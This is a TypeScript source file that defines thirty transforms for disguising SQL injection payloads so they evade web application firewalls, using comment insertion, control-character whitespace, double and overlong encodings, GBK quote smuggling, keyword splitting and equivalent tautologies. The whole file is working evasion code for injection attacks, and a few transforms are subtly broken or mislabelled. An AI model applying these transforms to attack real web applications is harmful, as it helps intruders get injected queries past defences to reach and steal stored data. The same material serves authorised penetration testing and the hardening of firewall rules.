export interface WafBypassTransform {
  id: string;
  name: string;
  category: 'whitespace' | 'comment' | 'encoding' | 'case' | 'ast_equivalence' | 'keyword_splitting';
  description: string;
  transform: (payload: string) => string;
}

/**
 * 30 Advanced Evasion Transformations (E1 - E30) for perimeter WAF bypass
 */
export const WAF_BYPASS_TRANSFORMS: WafBypassTransform[] = [
  // --- WHITESPACE & COMMENTS (E1 - E6) ---
  {
    id: 'E1_INLINE_COMMENT_SPACE',
    name: 'Inline Comment Space Replacement',
    category: 'comment',
    description: 'Replaces ASCII spaces with C-style inline comments /**/',
    transform: (p: string) => p.replace(/ /g, '/**/'),
  },
  {
    id: 'E2_VERSION_COMMENT_MYSQL',
    name: 'MySQL Versioned Comment (/*!50000 */)',
    category: 'comment',
    description: 'Encloses keywords in conditional execution comments parsed only by MySQL',
    transform: (p: string) => p.replace(/\b(UNION|SELECT|FROM|WHERE|AND|OR)\b/gi, '/*!50000$1*/'),
  },
  {
    id: 'E3_TAB_NEWLINE_WHITESPACE',
    name: 'Tab and Line Feed Whitespace',
    category: 'whitespace',
    description: 'Replaces spaces with tab (0x09) and newline (0x0A) control characters',
    transform: (p: string) => p.replace(/ /g, '%09'),
  },
  {
    id: 'E4_VERTICAL_TAB_FORMFEED',
    name: 'Vertical Tab & Form Feed (0x0B, 0x0C)',
    category: 'whitespace',
    description: 'Replaces spaces with vertical tab (%0b) and form feed (%0c)',
    transform: (p: string) => p.replace(/ /g, '%0b'),
  },
  {
    id: 'E5_PARENTHESIS_SPACELESS',
    name: 'Parenthesis Spaceless Query Wrapping',
    category: 'ast_equivalence',
    description: 'Removes spaces around keywords by enclosing identifiers in parentheses: SELECT(col)FROM(tbl)',
    transform: (p: string) => p.replace(/\s+FROM\s+/gi, ' FROM(').replace(/\s+WHERE\s+/gi, ')WHERE('),
  },
  {
    id: 'E6_UNTERMINATED_INLINE_COMMENT',
    name: 'Unterminated Inline Comment Prefix',
    category: 'comment',
    description: 'Prepends unterminated inline comments /*!--+*/ to confuse regex tokenizers',
    transform: (p: string) => `/*!12345${p}*/`,
  },

  // --- CASE & ENCODING (E7 - E15) ---
  {
    id: 'E7_RANDOM_CASE_MUTATION',
    name: 'Randomized Keyword Case Mutation',
    category: 'case',
    description: 'Randomizes case of SQL keywords (e.g. uNiOn SeLeCt)',
    transform: (p: string) =>
      p.replace(/\b([a-zA-Z]+)\b/g, (match) =>
        match
          .split('')
          .map((c, i) => (i % 2 === 0 ? c.toUpperCase() : c.toLowerCase()))
          .join('')
      ),
  },
  {
    id: 'E8_URL_DOUBLE_ENCODING',
    name: 'URL Double Encoding (%2527)',
    category: 'encoding',
    description: 'Double URL encodes critical delimiter characters',
    transform: (p: string) =>
      p
        .replace(/'/g, '%2527')
        .replace(/"/g, '%2522')
        .replace(/ /g, '%2520')
        .replace(/=/g, '%253D'),
  },
  {
    id: 'E9_HEX_LITERAL_ENCODING',
    name: 'Hex Literal Representation',
    category: 'encoding',
    description: 'Converts literal strings into hexadecimal byte notation (0x61646d696e)',
    transform: (p: string) =>
      p.replace(/'([^']+)'/g, (_, str) => '0x' + Buffer.from(str, 'utf8').toString('hex')),
  },
  {
    id: 'E10_UNICODE_FULLWIDTH',
    name: 'Unicode Fullwidth Character Normalization',
    category: 'encoding',
    description: 'Uses fullwidth Unicode characters normalized by backend IIS/Java decoders',
    transform: (p: string) =>
      p
        .replace(/'/g, '%uff07')
        .replace(/ /g, '%u3000')
        .replace(/=/g, '%uff1d'),
  },
  {
    id: 'E11_GBK_MULTIBYTE_SMUGGLING',
    name: 'GBK Multibyte Backslash Smuggling (%bf%27)',
    category: 'encoding',
    description: 'Prepends %bf to single quotes to consume backend escape backslashes under GBK/Big5 character sets',
    transform: (p: string) => p.replace(/'/g, '%bf%27'),
  },
  {
    id: 'E12_SCIENTIFIC_NOTATION',
    name: 'Scientific Notation Numeric Obfuscation',
    category: 'ast_equivalence',
    description: 'Replaces integer constants with scientific float literals (1e0=1e0)',
    transform: (p: string) => p.replace(/\b1=1\b/g, '1e0=1e0').replace(/\b1=2\b/g, '1e0=2e0'),
  },
  {
    id: 'E13_NULL_BYTE_TERMINATOR',
    name: 'Null Byte String Terminator (%00)',
    category: 'encoding',
    description: 'Injects null byte %00 before quotes to terminate C-string buffers in legacy extensions',
    transform: (p: string) => p.replace(/'/g, "%00'"),
  },
  {
    id: 'E14_UTF8_OVERLONG_ENCODING',
    name: 'UTF-8 Overlong Delimiter Sequence (%c0%27)',
    category: 'encoding',
    description: 'Replaces quotes with non-standard 2-byte UTF-8 overlong sequences parsed by vulnerable decoders',
    transform: (p: string) => p.replace(/'/g, '%c0%27').replace(/"/g, '%c0%22'),
  },
  {
    id: 'E15_HTML_ENTITY_HEX',
    name: 'HTML/XML Hex Entity Encoding (&#x27;)',
    category: 'encoding',
    description: 'Encodes delimiters into XML/HTML hex entities for reflective and web-service contexts',
    transform: (p: string) => p.replace(/'/g, '&#x27;').replace(/=/g, '&#x3d;'),
  },

  // --- AST EQUIVALENCE & OPERATOR MUTATION (E16 - E20) ---
  {
    id: 'E16_BETWEEN_OP_EQUIVALENCE',
    name: 'BETWEEN Operator (Replacing Equals =)',
    category: 'ast_equivalence',
    description: 'Replaces = comparisons with BETWEEN bounds to bypass = signature blocks',
    transform: (p: string) => p.replace(/1=1/g, '1 BETWEEN 1 AND 1').replace(/1=2/g, '1 BETWEEN 2 AND 3'),
  },
  {
    id: 'E17_LIKE_OP_EQUIVALENCE',
    name: 'LIKE / SOUNDS LIKE Operator',
    category: 'ast_equivalence',
    description: 'Replaces = with LIKE operator',
    transform: (p: string) => p.replace(/1=1/g, '1 LIKE 1').replace(/1=2/g, '1 LIKE 2'),
  },
  {
    id: 'E18_ARITHMETIC_TAUTOLOGY',
    name: 'Arithmetic Obfuscated Tautology',
    category: 'ast_equivalence',
    description: 'Replaces 1=1 with randomized algebraic balance: (4924=4875+49)',
    transform: (p: string) => p.replace(/1=1/g, '4924=(4875+49)').replace(/1=2/g, '4924=(4875+50)'),
  },
  {
    id: 'E19_NULLIF_GREATEST_MUTATION',
    name: 'NULLIF / GREATEST / LEAST Expression',
    category: 'ast_equivalence',
    description: 'Uses mathematical functions to generate true/false predicates',
    transform: (p: string) => p.replace(/1=1/g, 'GREATEST(1,2)=2').replace(/1=2/g, 'LEAST(1,2)=2'),
  },
  {
    id: 'E20_CONCAT_CHAR_STRING',
    name: 'CHAR / CHR Function String Assembly',
    category: 'encoding',
    description: 'Replaces literal quotes with CHR() / CHAR() concatenation',
    transform: (p: string) =>
      p.replace(/'admin'/g, 'CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))'),
  },

  // --- ADVANCED LOGIC, SPLITTERS & SERIALIZERS (E21 - E30) ---
  {
    id: 'E21_BITWISE_OPERATOR_LOGIC',
    name: 'Bitwise Logic Operator Substitution',
    category: 'ast_equivalence',
    description: 'Substitutes keyword AND/OR with bitwise operators (&, |)',
    transform: (p: string) => p.replace(/\bAND\s+1=1\b/gi, '& 1').replace(/\bOR\s+1=1\b/gi, '| 1'),
  },
  {
    id: 'E22_DOUBLE_NEGATIVE_LOGIC',
    name: 'Double Negative Logic Inversion',
    category: 'ast_equivalence',
    description: 'Wraps equality conditions in double negative NOT(NOT(...)) assertions',
    transform: (p: string) => p.replace(/\b1=1\b/g, 'NOT(NOT(1=1))').replace(/\b1=2\b/g, 'NOT(NOT(1=2))'),
  },
  {
    id: 'E23_SEMICOLON_STACKED_SPLIT',
    name: 'Semicolon Statement Termination Padding',
    category: 'whitespace',
    description: 'Terminates active query context using semicolon with padded statement boundaries',
    transform: (p: string) => (p.startsWith(';') ? p : `; ${p}`),
  },
  {
    id: 'E24_LINEBREAK_CRLF_SPLIT',
    name: 'Line Break CRLF Keyword Separation (%0d%0a)',
    category: 'whitespace',
    description: 'Replaces spaces with CRLF control bytes (%0d%0a) to break linear regex inspections',
    transform: (p: string) => p.replace(/ /g, '%0d%0a'),
  },
  {
    id: 'E25_CONCAT_COMMENT_SPLIT',
    name: 'Keyword Inline Comment Fracturing',
    category: 'keyword_splitting',
    description: 'Splits SQL keywords with inline comments (UN/**/ION SE/**/LECT)',
    transform: (p: string) =>
      p
        .replace(/\bUNION\b/gi, 'UN/**/ION')
        .replace(/\bSELECT\b/gi, 'SE/**/LECT')
        .replace(/\bWHERE\b/gi, 'WH/**/ERE'),
  },
  {
    id: 'E26_PARENTHESIS_FUNCTION_WRAP',
    name: 'Parenthesized Function Argument Wrapping',
    category: 'ast_equivalence',
    description: 'Wraps keyword function expressions in parentheses to eliminate whitespace',
    transform: (p: string) => p.replace(/\bSELECT\s+([a-zA-Z0-9_]+)\b/gi, 'SELECT($1)'),
  },
  {
    id: 'E27_REGEXP_OPERATOR_EQUIV',
    name: 'REGEXP / RLIKE Operator Equivalence',
    category: 'ast_equivalence',
    description: 'Substitutes equality checks with REGEXP pattern matches',
    transform: (p: string) => p.replace(/\b1=1\b/g, '1 REGEXP 1').replace(/\b1=2\b/g, '1 REGEXP 2'),
  },
  {
    id: 'E28_IN_OPERATOR_PREDICATE',
    name: 'IN Set Membership Predicate',
    category: 'ast_equivalence',
    description: 'Replaces scalar equality with set membership IN expressions',
    transform: (p: string) => p.replace(/\b1=1\b/g, '1 IN (1,2)').replace(/\b1=2\b/g, '1 IN (2,3)'),
  },
  {
    id: 'E29_JSON_ESCAPED_DELIMITER',
    name: 'JSON Escaped Delimiter Sequence (\\")',
    category: 'encoding',
    description: 'Escapes delimiters with backslashes for injection inside JSON string values',
    transform: (p: string) => p.replace(/'/g, '\\"').replace(/"/g, '\\"'),
  },
  {
    id: 'E30_XML_CDATA_WRAPPER',
    name: 'XML CDATA Block Encapsulation',
    category: 'encoding',
    description: 'Encloses injection payloads within XML CDATA sections to bypass XML entity filters',
    transform: (p: string) => `<![CDATA[${p}]]>`,
  },
];
